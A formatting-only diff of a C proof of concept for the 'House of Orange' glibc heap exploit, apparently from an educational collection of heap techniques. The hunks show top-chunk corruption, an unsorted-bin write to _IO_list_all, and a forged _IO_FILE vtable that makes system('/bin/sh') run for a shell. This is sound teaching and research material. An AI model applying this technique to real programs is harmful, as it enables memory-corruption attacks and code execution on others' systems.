@@ -12,7 +12,7 @@
    This function is just present to emulate the scenario where
    the address of the function system is known.
 */
-int winner ( char *ptr);
+int winner(char *ptr);
 
 int main()
 {
@@ -35,16 +35,16 @@ int main()
     size_t io_list_all, *top;
 
     fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
-        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
-  
+                    "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
+
     fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
-        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");
+                    "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");
 
     /*
       Firstly, lets allocate a chunk on the heap.
     */
 
-    p1 = malloc(0x400-16);
+    p1 = malloc(0x400 - 16);
 
     /*
        The heap is usually allocated with a top chunk of size 0x21000
@@ -69,7 +69,7 @@ int main()
        2) Top chunk's prev_inuse bit has to be set.
     */
 
-    top = (size_t *) ( (char *) p1 + 0x400 - 16);
+    top = (size_t *) ((char *) p1 + 0x400 - 16);
     top[1] = 0xc01;
 
     /* 
@@ -168,7 +168,7 @@ int main()
       Here, we require that chunk->bk->fd to be the value of _IO_list_all.
       So, we should set chunk->bk to be _IO_list_all - 16
     */
- 
+
     top[3] = io_list_all - 0x10;
 
     /*
@@ -176,7 +176,7 @@ int main()
       If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
     */
 
-    memcpy( ( char *) top, "/bin/sh\x00", 8);
+    memcpy((char *) top, "/bin/sh\x00", 8);
 
     /*
       The function _IO_flush_all_lockp iterates through the file pointer linked-list
@@ -226,15 +226,15 @@ int main()
       1. Set mode to 0: fp->_mode <= 0
     */
 
-    fp->_mode = 0; // top+0xc0
+    fp->_mode = 0;    // top+0xc0
 
 
     /*
       2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
     */
 
-    fp->_IO_write_base = (char *) 2; // top+0x20
-    fp->_IO_write_ptr = (char *) 3; // top+0x28
+    fp->_IO_write_base = (char *) 2;    // top+0x20
+    fp->_IO_write_ptr = (char *) 3;     // top+0x28
 
 
     /*
@@ -245,15 +245,15 @@ int main()
          4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
     */
 
-    size_t *jump_table = &top[12]; // controlled memory
+    size_t *jump_table = &top[12];    // controlled memory
     jump_table[3] = (size_t) &winner;
-    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
+    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table;    // top+0xd8
 
 
     /* Finally, trigger the whole chain by calling malloc */
     malloc(10);
 
-   /*
+    /*
      The libc's error message will be printed to the screen
      But you'll get a shell anyways.
    */
@@ -262,7 +262,7 @@ int main()
 }
 
 int winner(char *ptr)
-{ 
+{
     system(ptr);
     return 0;
 }
